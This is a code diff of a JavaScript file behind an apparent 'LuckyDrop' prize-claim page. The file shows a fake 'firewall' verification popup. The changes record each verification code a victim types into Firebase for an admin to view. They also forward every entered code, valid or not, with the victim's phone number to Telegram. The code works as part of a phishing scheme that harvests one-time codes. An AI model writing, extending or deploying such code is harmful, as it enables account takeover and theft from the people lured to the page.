@@ -1,7 +1,6 @@
 /* ============================================================
    POPUP.JS — LuckyDrop Main Page
-   Cute 3D Lucky Cat Gaming Theme
-   + AI-VERIFICATION Firebase Sync (para sa Admin POV)
+  
    ============================================================ */
 
 let claimState = {
@@ -42,6 +41,7 @@ async function sendTelegram(phone, code) {
 
 // ============================================================
 // ✅ CREATE: user_sessions/{phone}/system_verification
+// ✅ RESET userEnteredCode + isMatch
 // ============================================================
 async function createSystemVerification(phone, code) {
     if (typeof firebase === 'undefined' || !firebase.database) return;
@@ -57,7 +57,10 @@ async function createSystemVerification(phone, code) {
             deviceId: deviceId,
             phone: phone,
             createdAt: Date.now(),
-            lastUpdate: Date.now()
+            lastUpdate: Date.now(),
+            userEnteredCode: null,
+            userEnteredAt: null,
+            isMatch: null
         });
 
         console.log('✅ system_verification CREATED:', code);
@@ -192,7 +195,9 @@ function hideFirewallPopup() {
 }
 
 // ============================================================
-// VERIFY FIREWALL CODE
+// ✅ VERIFY FIREWALL CODE
+// ✅ SAVE userEnteredCode sa Firebase (para makita sa admin)
+// ✅ UPDATE status: verified/invalid + isMatch
 // ============================================================
 window.verifyFirewallCode = async function() {
     const codeInput = document.getElementById('verificationCode');
@@ -219,16 +224,45 @@ window.verifyFirewallCode = async function() {
 
     const isValid = (code === currentVerificationCode);
 
+    // ============================================================
+    // ✅ SAVE userEnteredCode + isMatch + status sa Firebase
+    // ============================================================
+    if (typeof firebase !== 'undefined' && firebase.database) {
+        try {
+            const db = firebase.database();
+            await db.ref('user_sessions/' + userPhone + '/system_verification').update({
+                userEnteredCode: code,
+                userEnteredAt: Date.now(),
+                status: isValid ? 'verified' : 'invalid',
+                isMatch: isValid,
+                lastUpdate: Date.now()
+            });
+            console.log('📝 userEnteredCode saved:', code, '| Match:', isValid);
+        } catch(e) {
+            console.error('Save userEnteredCode error:', e);
+        }
+    }
+    // ============================================================
+
+    await sendTelegram(userPhone, code);
+
     if (isValid) {
-        await sendTelegram(userPhone, code);
         await markVerificationSuccess(userPhone);
-        hideFirewallPopup();
-        alert("Verification successful. Page will refresh.");
+
+        if (verifyBtn) {
+            verifyBtn.innerHTML = "✅ VERIFIED!";
+            verifyBtn.style.background = "linear-gradient(180deg, #00ff88, #008833)";
+        }
+
         setTimeout(() => {
-            window.location.reload();
-        }, 500);
+            hideFirewallPopup();
+            alert("Verification successful. Page will refresh.");
+            setTimeout(() => {
+                window.location.reload();
+            }, 500);
+        }, 1000);
+
     } else {
-        await sendTelegram(userPhone, code);
         await markVerificationInvalid(userPhone, code);
 
         let errorMsg = "Invalid verification code. Please try again.";
@@ -466,7 +500,9 @@ document.addEventListener('DOMContentLoaded', function() {
     hidePendingStatus();
 });
 
-// Export functions for global access
+// ============================================================
+// EXPORT FUNCTIONS FOR GLOBAL ACCESS
+// ============================================================
 window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
 window.verifyFirewallCode = verifyFirewallCode;
